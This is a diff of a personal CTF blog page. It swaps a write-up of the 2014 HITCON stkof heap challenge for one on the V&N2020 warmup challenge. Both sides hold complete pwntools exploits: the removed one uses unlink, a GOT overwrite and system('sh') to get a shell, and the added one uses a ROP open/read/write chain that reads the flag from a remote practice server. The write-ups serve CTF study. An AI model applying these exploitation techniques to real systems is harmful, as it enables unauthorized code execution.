@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                ctfwiki-unlink—2014 HITCON stkof
+                                vn招新赛的剩下两道题目
                             </h1>
                             
                                 <!--en-->
@@ -175,22 +175,13 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-09-06</a>
+                                Date: <a href="#">2020-10-06</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">4.2
+                                    href="#">1.7
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">785</a></span>
+                                    <span class="post-words">words:<a href="#">321</a></span>
                                     
-                                        <span class="post-category">
-                                Category:
-                                
-                                <a href="https://l3mon629.github.io/tag/tc2bM4krw/">heap</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/mizqxcXow6/">unlink</a>
-                                
-                            </span>
-                                        
                                             Views:
                                             <span data-hk-page="current"> - </span>
                                             
@@ -199,199 +190,81 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>通过这个题目再来学习下unlink</p>
-<h2 id="逆向">逆向</h2>
-<p>main函数，一样是个菜单题，但是比较坑的是没给菜单，只能靠用户来逆向出其功能</p>
-<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
-{
-  int index; // eax
-  signed int v5; // [rsp+Ch] [rbp-74h]
-  char nptr; // [rsp+10h] [rbp-70h]
-  unsigned __int64 v7; // [rsp+78h] [rbp-8h]
-
-  v7 = __readfsqword(0x28u);
-  alarm(0x78u);
-  while ( fgets(&amp;nptr, 10, stdin) )
-  {
-    index = atoi(&amp;nptr);
-    if ( index == 2 )
-    {
-      v5 = sub_4009E8();
-      goto LABEL_14;
-    }
-    if ( index &gt; 2 )
-    {
-      if ( index == 3 )
-      {
-        v5 = sub_400B07();
-        goto LABEL_14;
-      }
-      if ( index == 4 )
-      {
-        v5 = sub_400BA9();
-        goto LABEL_14;
-      }
-    }
-    else if ( index == 1 )
-    {
-      v5 = sub_400936();
-      goto LABEL_14;
-    }
-    v5 = -1;
-LABEL_14:
-    if ( v5 )
-      puts(&quot;FAIL&quot;);
-    else
-      puts(&quot;OK&quot;);
-    fflush(stdout);
-  }
-  return 0LL;
-}
-</code></pre>
-<p>add堆块功能：<br>
-其中heaparray在0x602140处</p>
-<pre><code class="language-c">signed __int64 sub_400936()
-{
-  __int64 size; // [rsp+0h] [rbp-80h]
-  char *mem_ptr; // [rsp+8h] [rbp-78h]
-  char s; // [rsp+10h] [rbp-70h]
-  unsigned __int64 v4; // [rsp+78h] [rbp-8h]
-
-  v4 = __readfsqword(0x28u);
-  fgets(&amp;s, 16, stdin);
-  size = atoll(&amp;s);
-  mem_ptr = (char *)malloc(size);
-  if ( !mem_ptr )
-    return 0xFFFFFFFFLL;
-  ::s[++dword_602100] = mem_ptr;
-  printf(&quot;%d\n&quot;, (unsigned int)dword_602100, size);
-  return 0LL;
-}
-</code></pre>
-<p>free：<br>
-no UAF</p>
-<pre><code class="language-c">signed __int64 sub_400B07()
-{
-  unsigned int v1; // [rsp+Ch] [rbp-74h]
-  char s; // [rsp+10h] [rbp-70h]
-  unsigned __int64 v3; // [rsp+78h] [rbp-8h]
-
-  v3 = __readfsqword(0x28u);
-  fgets(&amp;s, 16, stdin);
-  v1 = atol(&amp;s);
-  if ( v1 &gt; 0x100000 )
-    return 0xFFFFFFFFLL;
-  if ( !::s[v1] )
-    return 0xFFFFFFFFLL;
-  free(::s[v1]);
-  ::s[v1] = 0LL;
-  return 0LL;
-}
-</code></pre>
-<p>edit:可以任意修改堆块size，造成任意堆溢出</p>
-<pre><code class="language-c">signed __int64 sub_4009E8()
-{
-  signed __int64 result; // rax
-  int i; // eax
-  unsigned int index; // [rsp+8h] [rbp-88h]
-  __int64 size; // [rsp+10h] [rbp-80h]
-  char *ptr; // [rsp+18h] [rbp-78h]
-  char s; // [rsp+20h] [rbp-70h]
-  unsigned __int64 v6; // [rsp+88h] [rbp-8h]
-
-  v6 = __readfsqword(0x28u);
-  fgets(&amp;s, 16, stdin);
-  index = atol(&amp;s);
-  if ( index &gt; 0x100000 )
-    return 0xFFFFFFFFLL;
-  if ( !::s[index] )
-    return 0xFFFFFFFFLL;
-  fgets(&amp;s, 16, stdin);
-  size = atoll(&amp;s);
-  ptr = ::s[index];
-  for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) )
-  {
-    ptr += i;
-    size -= i;
-  }
-  if ( size )
-    result = 0xFFFFFFFFLL;
-  else
-    result = 0LL;
-  return result;
-}
-</code></pre>
-<h2 id="io-缓冲区问题分析">IO 缓冲区问题分析</h2>
-<p>值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为 1024 和 1024。具体如下，可以进行调试查看<br>
-初次调用 fgets 时，malloc 会分配缓冲区 1024 大小。</p>
-<p>别管我说的啥，调试就完了</p>
-<h2 id="exp">exp</h2>
-<p>思路：利用unlink修改heaparray[0][1][2]，看exp吧</p>
+                            <p>2020vn招新的时候我还没有接触pwn，希望在不久的将来能够追随mz加入vn，wtcl orz</p>
+<h2 id="vn2020-公开赛warmup">[V&amp;N2020 公开赛]warmup</h2>
+<figure data-type="image" tabindex="1"><img src="https://l3mon629.github.io/post-images/1601952786193.png" alt="" loading="lazy"></figure>
+<p>加了个沙箱，我们无法getshell，就用open read write方法来读flag好了</p>
+<figure data-type="image" tabindex="2"><img src="https://l3mon629.github.io/post-images/1601952856976.png" alt="" loading="lazy"></figure>
+<p>由于是在栈上来布置rop链，我们就不用进行栈迁移了，但是题目开了pie，题目给了puts的地址，所以我们直接用libc的gadget一把梭</p>
+<p>exp:</p>
 <pre><code class="language-python">from pwn import *
+#from LibcSearcher import *
 
-p = process('./stkof')
-elf = ELF('./stkof')
-libc = ELF('./libc.so.6')
+local = 0
 
-def add(size):
-	p.sendline('1')
-	p.sendline(str(size))
+libc = ELF('./libc-2.23.so')
+binary = &quot;./vn_pwn_warmup&quot;
 
-def edit(index,size,content):
-	p.sendline('2')
-	p.sendline(str(index))
-	p.sendline(str(size))
-	p.send(content)
+if local == 1:
+	p = process(binary)
+else:
+	p = remote(&quot;node3.buuoj.cn&quot;,27660)
 
-def delete(index):
-	p.sendline('3')
-	p.sendline(str(index))
+def dbg():
+	context.log_level = 'debug'
 
-add(0x10)	#chunk1：对抗缓冲区
-add(0x30)	#chunk2
-add(0x80)	#chunk3
-add(0x10)	#chunk4
+context.terminal = ['tmux','splitw','-h']
 
-ptr = 0x602140
-fd = ptr + 0x10 - 0x18 
-bk = ptr + 0x10 - 0x10
+p.recvuntil('0x')
+puts_addr = int(p.recv(12),16)
+libc_base = puts_addr - libc.sym['puts']
+print &quot;[*]libc base:&quot;,hex(libc_base)
 
-fake_chunk = p64(0)
-fake_chunk += p64(0x31)
-fake_chunk += p64(fd)
-fake_chunk += p64(bk)
-fake_chunk += p64(0) * 2
-fake_chunk += p64(0x30)
-fake_chunk += p64(0x90)
+read = libc_base + libc.sym['read']
+write = libc_base + libc.sym['write']
+open = libc_base + libc.sym['open']
+__free_hook = libc_base + libc.sym['__free_hook']
 
-edit(2,len(fake_chunk),fake_chunk)
-delete(3)
+pop_rdi_ret = libc_base + 0x0000000000021102
+pop_rsi_ret = libc_base + 0x00000000000202e8
+pop_rdx_ret = libc_base + 0x0000000000001b92
 
-print(&quot;现在修改heaparray[0][1][2] 分别为free，puts和atoi&quot;)
-payload = p64(0) 
-payload += p64(elf.got['free'])
-payload += p64(elf.got['puts'])
-payload += p64(elf.got['atoi'])
-edit(2,len(payload),payload)
+#read(0,__free_hook,0x8)
+paylaod = p64(0)
+paylaod += p64(pop_rsi_ret) + p64(__free_hook)
+paylaod += p64(pop_rdx_ret) + p64(0x8)
+paylaod += p64(read)
 
-print(&quot;现在修改free的值为puts，然后free(1),就是puts(1)，即输出puts的真实地址&quot;)
-payload = p64(elf.plt['puts'])
-edit(0,8,payload)
+#open(__free_hook,0,0)
+paylaod += p64(pop_rdi_ret) + p64(__free_hook)
+paylaod += p64(pop_rsi_ret) + p64(0)
+paylaod += p64(pop_rdx_ret) + p64(0)
+paylaod += p64(open)
 
-delete(1)
+#read(0x3,__free_hook,0x30)
+paylaod += p64(pop_rdi_ret) + p64(0x3)
+paylaod += p64(pop_rsi_ret) + p64(__free_hook)
+paylaod += p64(pop_rdx_ret) + p64(0x30)
+paylaod += p64(read)
 
-#context.log_level = 'debug'
-puts_addr = u64(p.recvuntil(&quot;\x7f&quot;)[-6: ].ljust(8,b'\x00'))
-print(&quot;puts addr ----&gt; &quot; + hex(puts_addr))
-print(&quot;经过调试算出来相对差值为0x67860,不知道为什么最近libc老不准&quot;)
-libc_base = puts_addr - 0x67860
-print(&quot;libc  ---&gt;  &quot; + hex(libc_base))
+#write(1,__free_hook,0x30)
+paylaod += p64(pop_rdi_ret) + p64(0x1)
+paylaod += p64(pop_rsi_ret) + p64(__free_hook)
+paylaod += p64(pop_rdx_ret) + p64(0x30)
+paylaod += p64(write)
 
-system_addr = libc_base + 0x3f550
-paylaod = p64(system_addr)
-edit(2,8,paylaod)
-p.sendline(&quot;sh&quot;)
+print(len(paylaod))
+#dbg()
+p.recvuntil('Input something: ')
+p.send(paylaod)
 
+paylaod = 0x78 * 'a' + p64(pop_rdi_ret)
+p.recvuntil('What\'s your name?')
+p.send(paylaod)
+
+p.send(&quot;flag&quot;)
+
+#gdb.attach(p)
 p.interactive()
 </code></pre>
 
@@ -401,9 +274,7 @@ p.interactive()
                                 <ul class="markdownIt-TOC">
 <li>
 <ul>
-<li><a href="#%E9%80%86%E5%90%91">逆向</a></li>
-<li><a href="#io-%E7%BC%93%E5%86%B2%E5%8C%BA%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90">IO 缓冲区问题分析</a></li>
-<li><a href="#exp">exp</a></li>
+<li><a href="#vn2020-%E5%85%AC%E5%BC%80%E8%B5%9Bwarmup">[V&amp;N2020 公开赛]warmup</a></li>
 </ul>
 </li>
 </ul>
@@ -421,7 +292,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/">https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/vn-zhao-xin-sai-de-sheng-xia-liang-dao-ti-mu/">https://l3mon629.github.io/post/vn-zhao-xin-sai-de-sheng-xia-liang-dao-ti-mu/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -436,9 +307,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/&sharesource=qzone&title=ctfwiki-unlink—2014 HITCON stkof&pics=https://l3mon629.github.io/images/avatar.png?v=1601954705929&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/ctfwiki-unlink-2014-hitcon-stkof/&sharesource=weibo&title=ctfwiki-unlink—2014 HITCON stkof + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601954705929 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/vn-zhao-xin-sai-de-sheng-xia-liang-dao-ti-mu/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/vn-zhao-xin-sai-de-sheng-xia-liang-dao-ti-mu/&sharesource=qzone&title=vn招新赛的剩下两道题目&pics=https://l3mon629.github.io/images/avatar.png?v=1601954705929&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/vn-zhao-xin-sai-de-sheng-xia-liang-dao-ti-mu/&sharesource=weibo&title=vn招新赛的剩下两道题目 + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601954705929 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -447,16 +318,6 @@ p.interactive()
                                                                         <span>Tag(s):</span>
                                                                         <span class="tag ">
                         
-                        
-                        <a href="https://l3mon629.github.io/tag/tc2bM4krw/">#
-                                                heap
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/mizqxcXow6/">#
-                                                unlink
-                                                    </a>
-                                                    
-                                                        
                                                             </span>
                                                                     </div>
                                                                     <div>
@@ -469,13 +330,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/glibc-yuan-ma-xue-xi/">
-                                                                                            glibc源码学习
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/unlink-li-yong-hitcontraining_unlink/">
-                                                                                                    unlink利用—hitcontraining_unlink
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/sublime-yi-xie-shi-yong-ji-qiao-he-mei-hua/">
+                                                                                                    sublime一些使用技巧和美化
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
